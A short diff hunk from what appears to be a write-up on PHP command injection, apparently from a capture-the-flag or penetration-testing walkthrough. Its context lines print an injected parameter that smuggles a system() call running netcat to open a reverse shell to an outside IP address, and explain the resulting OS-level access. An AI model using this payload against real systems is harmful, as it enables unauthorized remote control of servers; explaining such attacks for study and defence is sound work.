@@ -183,3 +183,5 @@ This can be weaponized by injecting a payload like:
 ```message=hello;system("nc 104.244.192.142 5555 -e /bin/bash")```
 
 Which would open up a reverse shell to my host, assuming I had configured it on my host ahead of time. This would give me full OS-level command injection via a reverse shell instead of just through PHP/web requests. 
+
+## 
